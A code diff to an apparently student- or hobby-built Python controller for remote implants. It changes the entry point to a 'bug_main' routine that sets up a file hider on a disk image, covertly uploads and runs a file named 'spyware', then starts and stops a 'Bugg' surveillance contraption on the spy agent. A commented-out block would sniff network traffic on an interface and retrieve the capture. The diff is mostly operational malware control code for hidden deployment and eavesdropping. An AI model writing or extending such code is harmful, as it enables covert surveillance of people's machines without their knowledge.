@@ -102,12 +102,11 @@ def main_with_ui():
         UI.call_method_raw(ui, value)
         selected = ui.ctx.selected_operation
         if selected:
-            value = input(f"<{selected}>{prompt}")
-        else:
-            value = input(prompt)
+            value = input(f'<{selected}>$ ')
+        else: 
+            value = input(f'$ ')
 
-
-def another_main():
+def bug_main():
     targetHiderPath = "./sentHider.o"
 
     image_path = "fs.iso"
@@ -131,6 +130,8 @@ def another_main():
 
     manegerAgent: Agent = op.managerAgent
 
+    print(manegerAgent.run_bash("ls"))
+
     print(
         manegerAgent.write_file(
             "hider",
@@ -139,10 +140,31 @@ def another_main():
     )
 
     print(manegerAgent.hider_setup(targetHiderPath, image_path, mount_path))
-    print(manegerAgent.list_files()[1].decode())
-    print(manegerAgent.retrieve_file("fishTest.txt"))
 
+    print(
+        manegerAgent.hidden_action_with_upload(
+            FunCode.HIDDEN_UPLOAD | FunCode.HIDDEN_RUN,
+            "spyware",
+            "sentSpyware" + str(randint(1, 1000)) + ".spy",
+        )
+    )
+    while op.spyAgent is None:
+        sleep(1)
+    spyAgent: Agent = op.spyAgent
+
+    print(spyAgent.hider_setup(targetHiderPath, image_path, mount_path))
+    BugPar = Params()
+    BugPar.BuggP = BuggPrams(40)
+    BuggP = ContParams(BuggType, BugPar)
+    print("--------Running Bugg----------")
+    print(spyAgent.runContraption(BuggP, 10))
+    sleep(60)
+    print(spyAgent.haltContraption(10))
+    print("--------Stopping Bugg----------")
+    # sniffP = ContParams(SnifferType, Params(SniffParams(20, b"ens33")))
+    # print(spyAgent.runContraption(sniffP, 10))
+    # sleep(30)
+    # print(spyAgent.retrieve_file("0.sniff"))
 
 if __name__ == "__main__":
-    main_with_ui()
-    # another_main()
+    bug_main()
